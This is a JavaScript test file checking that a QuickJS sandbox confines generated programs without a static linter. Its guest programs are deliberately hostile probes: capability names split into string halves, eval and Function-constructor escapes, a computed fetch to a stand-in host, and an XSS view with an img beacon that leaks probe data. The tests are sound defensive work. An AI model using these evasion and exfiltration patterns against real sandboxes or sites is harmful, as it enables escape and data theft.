// Confinement, tested with the AST gate bypassed entirely.
//
// Removing the mandatory identifier denylist is only safe if confinement is
// established independently of it, so this file deliberately does not import
// src/gate.js and every program below is one the linter would have rejected:
// they use eval, the Function constructor, globalThis, and computed property
// access assembled at runtime. None of it acquires a host capability, because
// no host capability exists inside the QuickJS runtime.
//
// What is asserted here is the guest's reachable surface and the runtime's
// interface contract. Browser-level isolation, the frame and the markup
// policy have their own evidence elsewhere.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { getQuickJS } from "quickjs-emscripten";
import { createCore } from "../src/runtime/core.js";
import { preprocessHtml } from "../src/adapters/parse5.js";
import { checkTree, setClassAllowlist } from "../src/policy.js";

const QuickJS = await getQuickJS();
setClassAllowlist(["card", "muted"]);

// Capability names a generated program might reach for. Computed access,
// aliases and generated source all resolve through the same global object, so
// one lookup list covers every spelling of the same attempt.
const HOST_CAPABILITIES = [
  "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "navigator", "document", "window",
  "self", "parent", "top", "frames", "location", "history", "localStorage", "sessionStorage",
  "indexedDB", "caches", "cookieStore", "crypto", "postMessage", "importScripts", "Worker",
  "SharedWorker", "MessageChannel", "BroadcastChannel", "Notification", "open",
  "setTimeout", "setInterval", "setImmediate", "queueMicrotask", "requestAnimationFrame",
  "require", "module", "process", "global", "Deno", "Bun", "std", "os", "print", "console",
  "scriptArgs", "WebAssembly", "Atomics", "XPathEvaluator", "createImageBitmap",
];

// Everything QuickJS's own standard library provides, plus the two bindings
// this runtime installs on purpose. Anything else appearing on the guest
// global is a new capability and must fail this test until it is reviewed.
const STANDARD_GLOBALS = new Set([
  "AggregateError", "Array", "ArrayBuffer", "BigInt", "BigInt64Array", "BigUint64Array",
  "Boolean", "DataView", "Date", "Error", "EvalError", "Float16Array", "Float32Array",
  "Float64Array", "Function", "Infinity", "Int16Array", "Int32Array", "Int8Array",
  "InternalError", "JSON", "Map", "Math", "NaN", "Number", "Object", "Promise", "Proxy",
  "RangeError", "ReferenceError", "Reflect", "RegExp", "Set", "SharedArrayBuffer", "String",
  "Symbol", "SyntaxError", "TypeError", "URIError", "Uint16Array", "Uint32Array", "Uint8Array",
  "Uint8ClampedArray", "WeakMap", "WeakRef", "WeakSet", "decodeURI", "decodeURIComponent",
  "encodeURI", "encodeURIComponent", "escape", "eval", "globalThis", "isFinite", "isNaN",
  "parseFloat", "parseInt", "undefined", "unescape", "FinalizationRegistry",
]);
// Installed by src/runtime/core.js on purpose: JSON/String helpers captured
// before the program runs, and the host's frozen dataset.
const INSTALLED_GLOBALS = new Set(["__host", "data"]);

function run(source, data = null) {
  const core = createCore(QuickJS);
  try {
    core.load(source, data);
    return core.init();
  } finally {
    core.dispose();
  }
}

const reporter = (expression) => `
const initialState = { n: 0 };
function update(state, event) { return state; }
function view(state) { return "<p>" + (${expression}) + "</p>"; }`;

test("[R-RT-ISOLATION] the guest global object exposes the standard library and nothing else", () => {
  const { view } = run(reporter(`Object.getOwnPropertyNames(globalThis).sort().join(",")`));
  const names = view.replace(/^<p>|<\/p>$/g, "").split(",");
  const unexpected = names.filter(
    (name) => !STANDARD_GLOBALS.has(name) && !INSTALLED_GLOBALS.has(name) && !["update", "view"].includes(name),
  );
  assert.deepEqual(unexpected, [], `unreviewed globals reachable by generated code: ${unexpected.join(", ")}`);
});

test("[R-RT-ISOLATION] computed access to every host capability yields undefined", () => {
  // The names are assembled at runtime from halves, so no static scan of the
  // source could have contributed to this result.
  const { view } = run(`
const initialState = { n: 0 };
function update(state, event) { return state; }
function view(state) {
  const halves = ${JSON.stringify(HOST_CAPABILITIES.map((n) => [n.slice(0, 2), n.slice(2)]))};
  const found = [];
  for (const [a, b] of halves) {
    const name = a + b;
    if (typeof globalThis[name] !== "undefined") found.push(name);
    const viaReflect = Reflect.get(globalThis, name);
    if (viaReflect !== undefined) found.push("reflect:" + name);
  }
  return found.length ? found.join(",") : "none";
}`);
  assert.equal(view, "none");
});

test("[R-RT-ISOLATION] built-in dynamic evaluation stays inside the same capability boundary", () => {
  // eval and the Function constructor exist in this QuickJS build. They are
  // not a hole: code they create runs in the same runtime with the same
  // global object, which has no host capabilities to hand out.
  const { view } = run(`
const initialState = { n: 0 };
function update(state, event) { return state; }
function view(state) {
  const results = [];
  results.push("eval=" + typeof eval("globalThis[\\"fe\\" + \\"tch\\"]"));
  results.push("fn=" + typeof new Function("return globalThis[\\"doc\\" + \\"ument\\"]")());
  const indirect = eval;
  results.push("indirect=" + typeof indirect("globalThis[\\"XMLHttp\\" + \\"Request\\"]"));
  const smuggled = new Function("return this")();
  results.push("this-is-global=" + (smuggled === globalThis));
  results.push("ctor=" + typeof (function(){}).constructor("return globalThis[\\"pro\\" + \\"cess\\"]")());
  results.push("ctor-chain=" + typeof ({}).constructor.constructor("return globalThis[\\"req\\" + \\"uire\\"]")());
  // Dynamic import produces a promise, not a module: nothing can settle it,
  // because no module loader exists and no job queue is drained inside a
  // synchronous interface call.
  try {
    const pending = eval("import(\\"node:fs\\")");
    let settled = "never";
    pending.then(() => { settled = "resolved"; }, () => { settled = "rejected"; });
    results.push("import=" + typeof pending + " settled=" + settled);
  } catch (error) {
    results.push("import=threw:" + error.name + " settled=never");
  }
  return results.join(" ");
}`);
  assert.match(view, /eval=undefined/);
  assert.match(view, /fn=undefined/);
  assert.match(view, /indirect=undefined/);
  assert.match(view, /this-is-global=true/);
  assert.match(view, /ctor=undefined/);
  assert.match(view, /ctor-chain=undefined/);
  // A module loader is not reachable either way: import() throws, or it hands
  // back a promise that cannot settle during the guest's synchronous call.
  assert.match(view, /import=(undefined|object|threw:\w+)/);
  assert.match(view, /settled=never/);
});

test("[R-RT-ISOLATION] the only host-installed binding is a frozen set of JSON helpers", () => {
  const { view } = run(reporter(`
    Object.getOwnPropertyNames(__host).sort().join(",") + "|frozen=" + Object.isFrozen(__host) +
    "|types=" + Object.getOwnPropertyNames(__host).map((k) => typeof __host[k]).join(",")`));
  const [keys, frozen, types] = view.replace(/^<p>|<\/p>$/g, "").split("|");
  for (const key of keys.split(",")) {
    assert.ok(["parse", "stringify", "str", "detail"].includes(key), `unexpected __host member ${key}`);
  }
  assert.equal(frozen, "frozen=true");
  assert.ok(types.replace("types=", "").split(",").every((t) => t === "function"));
});

test("[R-RT-ISOLATION] reaching for a capability fails inside QuickJS, with a bounded host-side error", () => {
  // This is the demo's attack program: the lookup is computed, so no static
  // denylist is involved in stopping it.
  assert.throws(
    () => run(`
const reach = (name) => globalThis[name];
const initialState = { leak: reach("fe" + "tch")("https://example.invalid/x") };
function update(state, event) { return state; }
function view(state) { return "<p>never rendered</p>"; }`),
    (error) => {
      assert.ok(error instanceof Error);
      assert.ok(error.message.length <= 2200, "host-side error must be bounded");
      assert.match(error.message, /TypeError|not a function/);
      return true;
    },
  );
});

test("[R-RT-ISOLATION] the interface check, not a static scan, is what rejects unusable programs", () => {
  // Missing interface members.
  assert.throws(() => run(`const initialState = 1; function view() { return "<p>x</p>"; }`), /update/);
  assert.throws(() => run(`const initialState = 1; function update(s) { return s; }`), /view/);
  assert.throws(() => run(`function update(s) { return s; } function view() { return "<p>x</p>"; }`), /initialState/);
  // Asynchronous results are not made to work: they fail the checks.
  assert.throws(
    () => run(`const initialState = 1; function update(s) { return s; } async function view() { return "<p>x</p>"; }`),
    /view must return a string|string/,
  );
});

test("[R-RT-LIMITS] a pathological program shape fails bounded inside QuickJS instead of crashing the host", () => {
  // R3's second half, now that no AST walk precedes execution: a long
  // property chain and deeply nested expressions reach QuickJS directly. The
  // host must see a bounded error or a normal result, never a stack overflow
  // of its own.
  const chain = `a${".b".repeat(20000)}`;
  assert.throws(() => run(`
const initialState = { n: 0 };
function update(state, event) { return state; }
function view(state) { return "<p>" + ${chain} + "</p>"; }`), (error) => {
    assert.ok(error instanceof Error);
    assert.ok(error.message.length <= 2200);
    assert.match(error.message, /ReferenceError|not defined|stack|memory/i);
    return true;
  });

  // A deeply nested expression: QuickJS's own compiler refuses it under its
  // stack limit, and the failure arrives as a bounded host-side error.
  assert.throws(() => run(`
const initialState = ${"(".repeat(20000)}1${")".repeat(20000)};
function update(state, event) { return state; }
function view(state) { return "<p>x</p>"; }`), (error) => {
    assert.ok(error.message.length <= 2200, error.message.length);
    return true;
  });

  // The benign control still works after those failures.
  const { view } = run(reporter(`"ok"`));
  assert.equal(view, "<p>ok</p>");
});

test("[R-RT-ISOLATION] a program the linter would reject still produces only policy-filtered output", () => {
  // Every construct the old gate denied is present, and the view is hostile.
  const { view } = run(`
const g = globalThis;
const dyn = eval;
const initialState = { n: 1, probe: typeof g["fe" + "tch"] };
function update(state, event) { return { ...state, n: state.n + 1 }; }
function view(state) {
  const leak = dyn("typeof globalThis.document");
  return '<div class="card"><script>alert(1)</script>' +
    '<img src="https://example.invalid/p?' + state.probe + leak + '">' +
    '<p onclick="alert(2)" class="muted">n=' + state.n + '</p>' +
    '<a href="javascript:alert(3)">link</a></div>';
}`);
  const pre = preprocessHtml(view);
  assert.equal(pre.status, "ok");
  const result = checkTree(pre.raw);
  assert.equal(result.status, "validated");
  const serialized = JSON.stringify(result.tree);
  for (const forbidden of ["script", "onclick", "img", "javascript:", "example.invalid", "href"]) {
    assert.ok(!serialized.includes(forbidden), `${forbidden} survived into the accepted tree`);
  }
  // The benign part is preserved, including what the program learned about
  // the absent capabilities: "undefined".
  assert.match(serialized, /n=1/);
  assert.match(serialized, /link/);
});

test("[R-GATE-INTERFACE] this confinement evidence does not depend on the linter", () => {
  const source = readFileSync(new URL("./confinement.test.js", import.meta.url), "utf8");
  // The needles are assembled at runtime so that this assertion, and the
  // explanatory comment at the top of the file, are not themselves hits.
  const importNeedle = ["import", ' { ', "gate"].join("");
  const callNeedle = ["gate", "Program("].join("");
  assert.ok(!source.includes(importNeedle), "confinement tests must not import the linter");
  assert.ok(!source.includes(callNeedle), "confinement tests must not call the linter");
});
